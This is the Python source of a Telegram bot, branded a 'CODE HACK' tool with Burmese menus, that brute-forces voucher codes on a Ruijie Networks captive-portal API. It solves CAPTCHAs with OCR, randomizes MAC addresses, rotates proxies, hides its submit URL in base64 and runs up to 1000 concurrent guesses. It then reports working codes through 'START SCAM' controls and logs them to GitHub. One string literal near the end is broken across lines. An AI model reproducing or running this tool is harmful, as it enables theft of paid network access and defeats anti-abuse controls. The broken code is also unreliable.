#!/usr/bin/env python3
"""
STAR LINK CODE HACK Bot — Enterprise Edition
=============================================

Features:
- Async Telegram bot with pyTelegramBotAPI
- High-performance voucher code scanning
- Auto CAPTCHA solving with ddddocr
- GitHub persistence layer
- Web server for health checks
- Comprehensive logging
- Rate limiting & user management
- Graceful shutdown

Author: Enhanced Version
License: MIT
"""

import asyncio
import aiohttp
import base64
import json
import logging
import os
import random
import re
import signal
import string
import sys
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Dict, List, Optional, Set, Tuple

import cv2
import ddddocr
import numpy as np
import telebot
from aiohttp import web
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==================== CONFIGURATION ====================
@dataclass
class Config:
    """Centralized configuration management."""

    # Required environment variables
    BOT_TOKEN: str = field(default_factory=lambda: os.environ.get("BOT_TOKEN", ""))
    GITHUB_TOKEN: str = field(default_factory=lambda: os.environ.get("GITHUB_TOKEN", ""))
    REPO_OWNER: str = field(default_factory=lambda: os.environ.get("REPO_OWNER", ""))
    REPO_NAME: str = field(default_factory=lambda: os.environ.get("REPO_NAME", ""))

    # Admin IDs from environment (comma-separated)
    ADMIN_IDS: Set[str] = field(default_factory=lambda: set(
        filter(None, os.environ.get("ADMIN_IDS", "1626617395").split(","))
    ))

    # Performance tuning
    CONCURRENCY: int = field(default_factory=lambda: int(os.environ.get("CONCURRENCY", "1000")))
    MAX_CONCURRENT_SCANS: int = field(default_factory=lambda: int(os.environ.get("MAX_SCANS", "20")))
    BATCH_SIZE: int = field(default_factory=lambda: int(os.environ.get("BATCH_SIZE", "1000")))

    # Timeouts (seconds)
    HTTP_TIMEOUT: int = 30
    CAPTCHA_TIMEOUT: int = 10
    PORTAL_CHECK_TIMEOUT: int = 15

    # Rate limiting
    RATE_LIMIT_REQUESTS: int = 100  # requests per window
    RATE_LIMIT_WINDOW: int = 60     # seconds

    # GitHub sync
    GITHUB_SYNC_INTERVAL: int = 180  # seconds

    # Web server
    WEB_PORT: int = field(default_factory=lambda: int(os.environ.get("PORT", os.environ.get("BOT_PORT", "8099"))))

    # Feature flags
    ENABLE_PROXY: bool = field(default_factory=lambda: os.environ.get("ENABLE_PROXY", "false").lower() == "true")

    def validate(self) -> List[str]:
        """Validate required configuration. Returns list of missing keys."""
        missing = []
        for key in ["BOT_TOKEN", "GITHUB_TOKEN", "REPO_OWNER", "REPO_NAME"]:
            if not getattr(self, key):
                missing.append(key)
        return missing


# ==================== LOGGING SETUP ====================
def setup_logging() -> logging.Logger:
    """Configure structured logging."""
    logger = logging.getLogger("StarLinkBot")
    logger.setLevel(logging.INFO)

    # Console handler with formatting
    console = logging.StreamHandler(sys.stdout)
    console.setLevel(logging.INFO)
    formatter = logging.Formatter(
        '%(asctime)s | %(levelname)-8s | %(name)s | %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    console.setFormatter(formatter)
    logger.addHandler(console)

    # File handler for errors
    os.makedirs("logs", exist_ok=True)
    file_handler = logging.FileHandler(f"logs/bot_{datetime.now():%Y%m%d}.log")
    file_handler.setLevel(logging.ERROR)
    file_handler.setFormatter(formatter)
    logger.addHandler(file_handler)

    return logger


logger = setup_logging()

# ==================== DATA MODELS ====================
@dataclass
class ScanTask:
    """Represents an active scan task."""
    task: asyncio.Task
    stop: bool = False
    scan_id: Optional[str] = None
    started_at: float = field(default_factory=time.monotonic)
    mode: str = ""
    chat_id: int = 0


@dataclass
class UserSession:
    """User session data with automatic cleanup."""
    chat_id: int
    session_url: Optional[str] = None
    selected_mode: Optional[str] = None
    start_digit: Optional[str] = None
    current_display_codes: List[str] = field(default_factory=list)
    last_admin_notified_url: str = ""
    created_at: float = field(default_factory=time.monotonic)
    last_activity: float = field(default_factory=time.monotonic)

    def touch(self):
        """Update last activity timestamp."""
        self.last_activity = time.monotonic()

    def is_expired(self, timeout_hours: int = 24) -> bool:
        """Check if session has expired."""
        return (time.monotonic() - self.last_activity) > (timeout_hours * 3600)


@dataclass
class RateLimiter:
    """Token bucket rate limiter."""
    max_tokens: int
    refill_rate: float  # tokens per second
    tokens: float = field(init=False)
    last_refill: float = field(default_factory=time.monotonic)

    def __post_init__(self):
        self.tokens = float(self.max_tokens)

    async def acquire(self) -> bool:
        """Try to acquire a token. Returns True if successful."""
        now = time.monotonic()
        elapsed = now - self.last_refill
        self.tokens = min(self.max_tokens, self.tokens + elapsed * self.refill_rate)
        self.last_refill = now

        if self.tokens >= 1.0:
            self.tokens -= 1.0
            return True
        return False


# ==================== GLOBAL STATE ====================
class BotState:
    """Centralized bot state management."""

    def __init__(self, config: Config):
        self.config = config
        self.bot: Optional[AsyncTeleBot] = None
        self.session: Optional[aiohttp.ClientSession] = None
        self.connector: Optional[aiohttp.TCPConnector] = None

        # User and task management
        self.users: Dict[int, UserSession] = {}
        self.scan_tasks: Dict[int, ScanTask] = {}
        self.success_messages: Dict[int, int] = {}
        self.success_texts: Dict[int, List[str]] = {}
        self.limited_messages: Dict[int, int] = {}
        self.limited_texts: Dict[int, List[str]] = {}

        # Rate limiting
        self.rate_limiters: Dict[int, RateLimiter] = {}

        # Concurrency control
        self.voucher_sem: Optional[asyncio.Semaphore] = None
        self.active_scans_count: int = 0
        self.active_scans_lock: asyncio.Lock = asyncio.Lock()

        # GitHub sync queue
        self.success_queue: asyncio.Queue = asyncio.Queue()

        # OCR
        self.ocr: Optional[ddddocr.DdddOcr] = None

        # Lifecycle
        self.start_time: float = time.monotonic()
        self._shutdown_event: asyncio.Event = asyncio.Event()

    def get_user(self, chat_id: int) -> UserSession:
        """Get or create user session."""
        if chat_id not in self.users:
            self.users[chat_id] = UserSession(chat_id=chat_id)
        user = self.users[chat_id]
        user.touch()
        return user

    def get_rate_limiter(self, chat_id: int) -> RateLimiter:
        """Get or create rate limiter for user."""
        if chat_id not in self.rate_limiters:
            self.rate_limiters[chat_id] = RateLimiter(
                max_tokens=self.config.RATE_LIMIT_REQUESTS,
                refill_rate=self.config.RATE_LIMIT_REQUESTS / self.config.RATE_LIMIT_WINDOW
            )
        return self.rate_limiters[chat_id]

    def cleanup_expired_sessions(self):
        """Remove expired user sessions."""
        expired = [
            cid for cid, user in self.users.items()
            if user.is_expired()
        ]
        for cid in expired:
            del self.users[cid]
            self.rate_limiters.pop(cid, None)
            logger.info(f"Cleaned up expired session for user {cid}")

    def is_admin(self, user_id: int) -> bool:
        """Check if user is admin."""
        return str(user_id) in self.config.ADMIN_IDS

    @property
    def uptime(self) -> Tuple[int, int, int]:
        """Get uptime as (hours, minutes, seconds)."""
        seconds = int(time.monotonic() - self.start_time)
        hours, rem = divmod(seconds, 3600)
        minutes, secs = divmod(rem, 60)
        return hours, minutes, secs


# ==================== INITIALIZATION ====================
config = Config()
missing = config.validate()
if missing:
    logger.error(f"Missing required environment variables: {', '.join(missing)}")
    raise SystemExit(
        "❌ Railway Variables tab တွင် အောက်ပါများ မထည့်ရသေးပါ:\n"
        + "\n".join(f"   • {k}" for k in missing)
    )

state = BotState(config)
state.bot = AsyncTeleBot(config.BOT_TOKEN)
state.voucher_sem = asyncio.Semaphore(config.CONCURRENCY)

# Initialize OCR
try:
    state.ocr = ddddocr.DdddOcr(show_ad=False)
    logger.info("OCR engine initialized successfully")
except Exception as e:
    logger.error(f"Failed to initialize OCR: {e}")
    state.ocr = None

# Proxy configuration (from environment)
PROXY_LIST = [
    proxy for proxy in os.environ.get("PROXY_LIST", "").split(",") if proxy.strip()
]
_proxy_index = 0

def get_next_proxy() -> Optional[str]:
    """Get next proxy from rotation."""
    global _proxy_index
    if not PROXY_LIST:
        return None
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    return f"http://{proxy}" if not proxy.startswith("http") else proxy


# ==================== KEYBOARDS ====================
class Keyboards:
    """Keyboard layouts."""

    @staticmethod
    def main() -> InlineKeyboardMarkup:
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("🔗 Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
            InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
            InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
            InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
        )
        return kb

    @staticmethod
    def voucher() -> InlineKeyboardMarkup:
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("🔢 VOUCHER 6 လုံး", callback_data="scan_6"),
            InlineKeyboardButton("🔢 VOUCHER 7 လုံး", callback_data="scan_7"),
            InlineKeyboardButton("🔢 VOUCHER 8 လုံး", callback_data="scan_8"),
            InlineKeyboardButton("🔢 VOUCHER 9 လုံး", callback_data="scan_9"),
            InlineKeyboardButton("🔤 VOUCHER ascii-lower", callback_data="scan_ascii-lower"),
            InlineKeyboardButton("🔤 VOUCHER ascii-lower 9လုံး", callback_data="scan_ascii-lower9"),
            InlineKeyboardButton("🎲 VOUCHER all", callback_data="scan_all"),
            InlineKeyboardButton("🔤+🔢 MIXED 6လုံး", callback_data="scan_mixed"),
            InlineKeyboardButton("🔤+🔢 MIXED 7လုံး", callback_data="scan_mixed7"),
            InlineKeyboardButton("🔤+🔢 MIXED 8လုံး", callback_data="scan_mixed8"),
            InlineKeyboardButton("🔤+🔢 MIXED 9လုံး", callback_data="scan_mixed9"),
            InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
        )
        return kb

    @staticmethod
    def digit(mode: str) -> InlineKeyboardMarkup:
        kb = InlineKeyboardMarkup(row_width=5)
        buttons = [InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}") for i in range(10)]
        kb.add(*buttons)
        kb.add(InlineKeyboardButton("🎲 Random", callback_data=f"digit_{mode}_random"))
        kb.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
        return kb

    @staticmethod
    def start_scam() -> InlineKeyboardMarkup:
        kb = InlineKeyboardMarkup(row_width=1)
        kb.add(
            InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"),
            InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
        )
        return kb

    @staticmethod
    def back() -> InlineKeyboardMarkup:
        kb = InlineKeyboardMarkup(row_width=1)
        kb.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
        return kb

    @staticmethod
    def scam_control() -> InlineKeyboardMarkup:
        kb = InlineKeyboardMarkup(row_width=1)
        kb.add(
            InlineKeyboardButton("🛑 STOP SCAM", callback_data="menu_stop"),
            InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
        )
        return kb


# ==================== WEB SERVER ====================
async def handle_health(request: web.Request) -> web.Response:
    """Health check endpoint."""
    hours, minutes, seconds = state.uptime
    return web.json_response({
        "status": "healthy",
        "uptime": f"{hours}h {minutes}m {seconds}s",
        "active_scans": sum(1 for t in state.scan_tasks.values() if not t.task.done()),
        "total_users": len(state.users),
        "version": "2.0.0"
    })

async def handle_root(request: web.Request) -> web.Response:
    """Root endpoint."""
    return web.Response(text="Star Link Bot is running 24/7!")

async def start_web_server() -> None:
    """Start web server for health checks."""
    app = web.Application()
    app.router.add_get('/', handle_root)
    app.router.add_get('/health', handle_health)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', config.WEB_PORT)
    await site.start()
    logger.info(f"Web server started on port {config.WEB_PORT}")


# ==================== GITHUB INTEGRATION ====================
class GitHubClient:
    """GitHub API client with error handling and retries."""

    BASE_URL = "https://api.github.com"

    def __init__(self, token: str, owner: str, repo: str):
        self.token = token
        self.owner = owner
        self.repo = repo
        self.headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json"
        }

    async def get_file(self, path: str) -> Tuple[dict, Optional[str]]:
        """Get file content from GitHub. Returns (content, sha)."""
        url = f"{self.BASE_URL}/repos/{self.owner}/{self.repo}/contents/{path}"

        for attempt in range(3):
            try:
                async with state.session.get(url, headers=self.headers) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        content = base64.b64decode(data['content']).decode('utf-8')
                        return json.loads(content), data['sha']
                    elif resp.status == 404:
                        return {}, None
                    else:
                        logger.warning(f"GitHub get_file attempt {attempt + 1}: {resp.status}")
                        await asyncio.sleep(2 ** attempt)
            except Exception as e:
                logger.error(f"GitHub get_file error (attempt {attempt + 1}): {e}")
                await asyncio.sleep(2 ** attempt)

        return {}, None

    async def update_file(self, path: str, content: dict, sha: Optional[str], message: str) -> bool:
        """Update file on GitHub."""
        url = f"{self.BASE_URL}/repos/{self.owner}/{self.repo}/contents/{path}"
        encoded = base64.b64encode(json.dumps(content, indent=2).encode()).decode()

        payload = {"message": message, "content": encoded}
        if sha:
            payload["sha"] = sha

        for attempt in range(3):
            try:
                async with state.session.put(url, headers=self.headers, json=payload) as resp:
                    if resp.status in (200, 201):
                        logger.info(f"GitHub file updated: {path}")
                        return True
                    else:
                        text = await resp.text()
                        logger.warning(f"GitHub update attempt {attempt + 1}: {resp.status} - {text[:100]}")
                        await asyncio.sleep(2 ** attempt)
            except Exception as e:
                logger.error(f"GitHub update error (attempt {attempt + 1}): {e}")
                await asyncio.sleep(2 ** attempt)

        return False


github = GitHubClient(config.GITHUB_TOKEN, config.REPO_OWNER, config.REPO_NAME)


async def github_sync_scheduler() -> None:
    """Periodically sync success codes to GitHub."""
    while not state._shutdown_event.is_set():
        try:
            await asyncio.wait_for(state._shutdown_event.wait(), timeout=config.GITHUB_SYNC_INTERVAL)
            break  # Shutdown signaled
        except asyncio.TimeoutError:
            pass

        items = []
        while not state.success_queue.empty():
            try:
                items.append(state.success_queue.get_nowait())
            except asyncio.QueueEmpty:
                break

        if not items:
            continue

        try:
            results, sha = await github.get_file("result.json")
            for item in items:
                uid = str(item["chat_id"])
                code = item["code"]
                if uid not in results:
                    results[uid] = []
                if code not in results[uid]:
                    results[uid].append(code)

            if await github.update_file("result.json", results, sha, f"Sync {len(items)} codes"):
                logger.info(f"Synced {len(items)} codes to GitHub")
            else:
                # Put items back in queue for retry
                for item in items:
                    await state.success_queue.put(item)
        except Exception as e:
            logger.error(f"GitHub sync error: {e}")
            # Put items back in queue
            for item in items:
                await state.success_queue.put(item)


# ==================== CODE GENERATORS ====================
class CodeGenerator:
    """Voucher code generators."""

    @staticmethod
    def digits(length: int) -> str:
        return "".join(random.choice(string.digits) for _ in range(length))

    @staticmethod
    def ascii_lower(length: int) -> str:
        return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

    @staticmethod
    def mixed(length: int) -> str:
        return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

    @staticmethod
    def all_chars(length: int) -> str:
        return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

    @classmethod
    def iter_codes(cls, mode: str, start_digit: Optional[str] = None):
        """Generate codes based on mode."""
        if mode in ["6", "7", "8", "9"]:
            length = int(mode)

            if start_digit is not None:
                # Sequential from start digit
                start = int(start_digit) * (10 ** (length - 1))
                end = (int(start_digit) + 1) * (10 ** (length - 1))
                for i in range(start, end):
                    yield str(i).zfill(length)
                return

            if mode in ["6", "7", "8"]:
                # Shuffled for modes with manageable keyspace
                codes = [str(i).zfill(length) for i in range(10 ** length)]
                random.shuffle(codes)
                yield from codes
            else:
                # Random for 9-digit (keyspace too large)
                while True:
                    yield cls.digits(9)

        elif mode == "ascii-lower":
            while True:
                yield cls.ascii_lower(6)

        elif mode == "ascii-lower9":
            while True:
                yield cls.ascii_lower(9)

        elif mode == "all":
            while True:
                yield cls.all_chars(6)

        elif mode == "mixed":
            while True:
                yield cls.mixed(6)

        elif mode == "mixed7":
            while True:
                yield cls.mixed(7)

        elif mode == "mixed8":
            while True:
                yield cls.mixed(8)

        elif mode == "mixed9":
            while True:
                yield cls.mixed(9)

        else:
            raise ValueError(f"Unsupported scan mode: {mode}")


# ==================== NETWORK HELPERS ====================
def get_random_mac() -> str:
    """Generate random locally-administered MAC address."""
    fb = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [fb] + [random.randint(0x00, 0xFF) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)


def replace_mac_in_url(url: str, new_mac: str) -> str:
    """Replace MAC address in URL."""
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)


async def get_session_id(sess: aiohttp.ClientSession, session_url: str, 
                         previous_session_id: Optional[str] = None) -> Optional[str]:
    """Extract session ID from portal URL."""
    mac = get_random_mac()
    modified_url = replace_mac_in_url(session_url, mac)

    headers = {
        'accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }

    try:
        async with sess.get(modified_url, headers=headers, allow_redirects=True,
                           timeout=aiohttp.ClientTimeout(total=config.HTTP_TIMEOUT)) as resp:
            m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(resp.url))
            return m.group(1) if m else previous_session_id
    except Exception as e:
        logger.debug(f"Session ID extraction failed: {e}")
        return previous_session_id


def ocr_captcha_sync(image_bytes: bytes) -> Optional[str]:
    """Synchronous CAPTCHA OCR."""
    if state.ocr is None:
        return None

    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return None

        # Preprocess for better OCR
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, encoded = cv2.imencode('.png', th)

        return state.ocr.classification(encoded.tobytes()).upper()
    except Exception as e:
        logger.error(f"OCR error: {e}")
        return None


async def ocr_captcha(image_bytes: bytes) -> Optional[str]:
    """Async wrapper for CAPTCHA OCR."""
    return await asyncio.to_thread(ocr_captcha_sync, image_bytes)


async def fetch_captcha_image(sess: aiohttp.ClientSession, session_id: str) -> Optional[bytes]:
    """Fetch CAPTCHA image."""
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/*,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}

    try:
        async with sess.get(
            'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
            params=params, headers=headers,
            timeout=aiohttp.ClientTimeout(total=config.CAPTCHA_TIMEOUT)
        ) as resp:
            if resp.status == 200:
                return await resp.read()
    except Exception as e:
        logger.debug(f"CAPTCHA fetch error: {e}")

    return None


async def verify_captcha(sess: aiohttp.ClientSession, session_id: str, text: str) -> bool:
    """Verify CAPTCHA solution."""
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    }

    try:
        async with sess.post(
            'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
            headers=headers,
            json={'sessionId': session_id, 'authCode': text},
            timeout=aiohttp.ClientTimeout(total=config.CAPTCHA_TIMEOUT)
        ) as resp:
            data = await resp.json()
            success = data.get("success", False)
            logger.debug(f"CAPTCHA verify: {text} -> {success}")
            return success
    except Exception as e:
        logger.debug(f"CAPTCHA verify error: {e}")
        return False


async def solve_captcha(sess: aiohttp.ClientSession, session_id: str, max_attempts: int = 8) -> Optional[str]:
    """Attempt to solve CAPTCHA with retries."""
    for attempt in range(max_attempts):
        try:
            image = await fetch_captcha_image(sess, session_id)
            if not image:
                continue

            text = await ocr_captcha(image)
            if text and await verify_captcha(sess, session_id, text):
                logger.info(f"CAPTCHA solved on attempt {attempt + 1}: {text}")
                return text
        except Exception as e:
            logger.debug(f"CAPTCHA attempt {attempt + 1} failed: {e}")

    logger.warning(f"Failed to solve CAPTCHA after {max_attempts} attempts")
    return None


# ==================== BALANCE / EXPIRY ====================
def minutes_to_human(total_minutes) -> str:
    """Convert minutes to human-readable format."""
    if total_minutes == 'Unknown':
        return 'Unknown'
    try:
        mins = int(total_minutes)
        hours, rem_min = divmod(mins, 60)
        if hours > 0 and rem_min > 0:
            return f"{hours}h {rem_min}m"
        elif hours > 0:
            return f"{hours}h"
        else:
            return f"{rem_min}m"
    except Exception:
        return 'Unknown'


async def get_code_expiry(active_id: str) -> Tuple[str, str]:
    """Get voucher expiry information."""
    paths = [
        f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/maccauth/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_id}',
    ]
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    async with aiohttp.ClientSession(
        connector=state.connector, connector_owner=False,
        cookie_jar=aiohttp.CookieJar(),
        timeout=aiohttp.ClientTimeout(total=10)
    ) as fs:
        for url in paths:
            try:
                async with fs.get(url, headers=headers) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        if data.get('success'):
                            result = data.get('result', {})
                            raw_mins = result.get('totalMinutes') or result.get('remainingMinutes') or 'Unknown'
                            profile = result.get('profileName', 'Unknown')
                            total_time = minutes_to_human(raw_mins)
                            return f"📋 Plan: {profile} | ⏳ Time: {total_time}", raw_mins
            except Exception as e:
                logger.debug(f"Balance check error: {e}")

    return "📋 Plan: Unknown | ⏳ Time: Unknown", 'Unknown'


# ==================== CORE SCANNING ====================
POST_URL = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()


async def perform_check(session_url: str, code: str, chat_id: int,
                        scan_id: Optional[str] = None,
                        recheck: bool = False,
                        message=None) -> Optional[str]:
    """
    Perform a single voucher code check.
    Returns code on success (recheck mode), None otherwise.
    """
    # Validate scan is still active
    if not recheck:
        task = state.scan_tasks.get(chat_id)
        if not task or task.scan_id != scan_id:
            return None

    response = None
    session_id = None

    for attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=config.HTTP_TIMEOUT)

        async with aiohttp.ClientSession(
            connector=state.connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(), timeout=timeout
        ) as ts:
            # Get session ID
            session_id = await get_session_id(ts, session_url)
            if not session_id:
                logger.debug(f"No session ID for code {code}")
                continue

            # Solve CAPTCHA
            auth_code = await solve_captcha(ts, session_id)
            if not auth_code:
                continue

            # Check if scan was stopped
            if not recheck:
                task = state.scan_tasks.get(chat_id)
                if not task or task.scan_id != scan_id or task.stop:
                    return None

            # Submit voucher code
            try:
                async with ts.post(
                    POST_URL,
                    json={
                        "accessCode": code,
                        "sessionId": session_id,
                        "apiVersion": 1,
                        "authCode": auth_code
                    },
                    headers={
                        "authority": "portal-as.ruijienetworks.com",
                        "accept": "*/*",
                        "content-type": "application/json",
                        "origin": "https://portal-as.ruijienetworks.com",
                        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
                    }
                ) as resp:
                    response = await resp.text()
                    logger.debug(f"Voucher check: {code} -> {response[:60]}")
            except Exception as e:
                logger.debug(f"Voucher submit error: {e}")
                return None

        # Handle rate limiting
        if response and 'request limited' in response:
            logger.warning(f"Rate limited on code {code}, retrying...")
            response = None
            await asyncio.sleep(1)
            continue

        break

    if not response:
        return None

    # Handle SUCCESS
    if 'logonUrl' in response:
        if recheck:
            return code

        expire_date, _ = await get_code_expiry(session_id)

        # Store success
        success_entry = f"🎫 {code}\n   {expire_date}"
        state.success_texts.setdefault(chat_id, []).append(success_entry)

        user = state.get_user(chat_id)
        user.current_display_codes.append(success_entry)
        code_line = "\n\n".join(user.current_display_codes)

        await state.success_queue.put({"chat_id": chat_id, "code": code})

        # Send/update message
        if message:
            try:
                if chat_id not in state.success_messages or len(code_line) > 4000:
                    sent = await state.bot.send_message(
                        chat_id, f"Success Codes:\n\n{success_entry}"
                    )
                    state.success_messages[chat_id] = sent.message_id
                    user.current_display_codes = [success_entry]
                else:
                    try:
                        await state.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=state.success_messages[chat_id],
                            text=f"Success Codes:\n\n{code_line}"
                        )
                    except Exception:
                        sent = await state.bot.send_message(
                            chat_id, f"Success Codes:\n\n{success_entry}"
                        )
                        state.success_messages[chat_id] = sent.message_id
                        user.current_display_codes = [success_entry]
            except Exception as e:
                logger.error(f"Success message error: {e}")

        return code

    # Handle LIMITED
    elif 'STA' in response:
        state.limited_texts.setdefault(chat_id, []).append(code)
        limited_line = "\n".join(state.limited_texts[chat_id])

        if message:
            try:
                if chat_id not in state.limited_messages:
                    sent = await state.bot.send_message(
                        chat_id, f"Limited Codes:\n\n{limited_line}"
                    )
                    state.limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await state.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=state.limited_messages[chat_id],
                            text=f"Limited Codes:\n\n{limited_line}"
                        )
                    except Exception:
                        sent = await state.bot.send_message(
                            chat_id, f"Limited Codes:\n\n{limited_line}"
                        )
                        state.limited_messages[chat_id] = sent.message_id
            except Exception as e:
                logger.error(f"Limited message error: {e}")

    return None


def format_progress(checked: int, total: Optional[int] = None, 
                    speed: float = 0, found: int = 0) -> str:
    """Format progress message."""
    speed_str = f"{speed:,.0f} codes/min"

    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (
            f"🔍 Scanning VOUCHER Codes...\n\n"
            f"📦 Checked: {checked:,}/{total:,}\n"
            f"📊 Progress: {percent:.2f}%\n"
            f"⚡ Speed: {speed_str}\n"
            f"✅ Success: {found}\n"
            f"[{bar}]"
        )

    return (
        f"🔍 Scanning VOUCHER Codes...\n\n"
        f"📦 Checked: {checked:,}\n"
        f"⚡ Speed: {speed_str}\n"
        f"✅ Success: {found}\n"
        f"📊 Status: running\n"
    )


async def run_bruteforce(mode: str, chat_id: int, session_url: str, scan_id: str,
                         message=None, progress_msg=None, 
                         start_digit: Optional[str] = None) -> None:
    """Main brute-force scanning loop."""
    try:
        code_iter = CodeGenerator.iter_codes(mode, start_digit=start_digit)
    except ValueError as e:
        await state.bot.send_message(chat_id, str(e))
        return

    total = (10 ** int(mode)) if mode in ["6", "7", "8"] else None
    checked = 0
    scan_start = time.monotonic()

    try:
        while True:
            # Check scan status
            task = state.scan_tasks.get(chat_id)
            if not task or task.scan_id != scan_id:
                return
            if task.stop:
                logger.info(f"Scan stopped by user {chat_id}")
                return

            # Get batch of codes
            batch = []
            for _ in range(config.BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break

            if not batch:
                break

            # Process batch concurrently
            async def check_one(code: str) -> None:
                async with state.voucher_sem:
                    await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[check_one(c) for c in batch], return_exceptions=True)
            checked += len(batch)

            # Update progress
            found = len(state.success_texts.get(chat_id, []))
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, total, speed, found)

            if progress_msg:
                try:
                    await state.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=progress_msg.message_id,
                        text=text
                    )
                except Exception:
                    try:
                        new_msg = await state.bot.send_message(chat_id, text)
                        progress_msg.message_id = new_msg.message_id
                    except Exception as e:
                        logger.error(f"Progress update error: {e}")

        # Scan completed
        found = len(state.success_texts.get(chat_id, []))
        finish_text = (
            f"🔍 Scanning Completed\n\n"
            f"📦 Checked: {checked:,}" + (f"/{total:,}" if total else "") +
            f"\n✅ Success: {found}\n"
            f"📊 Progress: 100%\n"
            f"[██████████████████]"
        )

        if progress_msg:
            try:
                await state.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=finish_text
                )
            except Exception:
                await state.bot.send_message(chat_id, finish_text)

        await send_success_file(chat_id)
        logger.info(f"Scan completed for user {chat_id}: {checked} checked, {found} found")

    except asyncio.CancelledError:
        logger.info(f"Scan cancelled for user {chat_id}")
        raise
    except Exception as e:
        logger.error(f"Scan error for user {chat_id}: {e}")
        await state.bot.send_message(chat_id, f"❌ Scan error: {str(e)[:200]}")
    finally:
        await send_success_file(chat_id)
        state.scan_tasks.pop(chat_id, None)
        state.success_messages.pop(chat_id, None)
        state.success_texts.pop(chat_id, None)
        state.limited_messages.pop(chat_id, None)
        state.limited_texts.pop(chat_id, None)

        async with state.active_scans_lock:
            state.active_scans_count = max(0, state.active_scans_count - 1)


async def send_success_file(chat_id: int) -> None:
    """Send success codes as file to eligible users."""
    # Get eligible IDs from environment
    target_ids = set(filter(None, os.environ.get("SUCCESS_FILE_IDS", "").split(",")))

    if str(chat_id) in target_ids and chat_id in state.success_texts and state.success_texts[chat_id]:
        try:
            filename = f"success_{chat_id}_{int(time.time())}.txt"
            content = "
".join(state.success_texts[chat_id])

            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)

            with open(filename, "rb") as f:
                await state.bot.send_document(
                    chat_id, f,
                    caption="✅ Scan ရပ်တန့်သောကြောင့် Success Codes ဖိုင်ပို့ပေးလိုက်ပါသည်။"
                )

            if os.path.exists(filename):
                os.remove(filename)
        except Exception as e:
            logger.error(f"send_success_file error: {e}")


